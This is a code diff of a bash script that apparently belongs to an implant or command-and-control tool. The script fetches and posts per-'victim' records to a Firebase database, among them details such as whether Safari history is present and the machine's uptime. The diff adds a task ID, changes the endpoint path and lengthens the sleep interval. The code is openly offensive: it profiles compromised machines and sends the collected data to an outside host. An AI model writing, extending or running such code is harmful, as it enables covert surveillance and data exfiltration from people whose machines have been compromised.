@@ -1,7 +1,10 @@
+#!/usr/bin/env bash
 # REST API
 # https://firebase.google.com/docs/reference/rest/database/
 
 SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
+
+thisTaskID="getDetails"
 
 victim="$1"
 rootIteration="$2"
@@ -22,7 +25,7 @@ echo $((iteration + 1)) > "$iterationFile"
 
 function getVictimDetails(){
 
-  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victim/details.json"
+  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID.json"
 
 }
 
@@ -56,7 +59,7 @@ function setVictimDetails(){
     \"hasSafariHistory\" : \"$hasSafariHistory\",
     \"uptime\" : \"$uptime\"
   }" \
-  "https://${firebaseProject}.firebaseio.com/victims/$victim/details.json"
+  "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID.json"
 }
 
 ###############################################################################
@@ -64,5 +67,5 @@ function setVictimDetails(){
 getVictimDetails
 setVictimDetails
 
-# We only need to run this for a few seconds, so sleep for a few
-sleep 5
+# We only need to run this a few times, so sleep for a few
+sleep 15
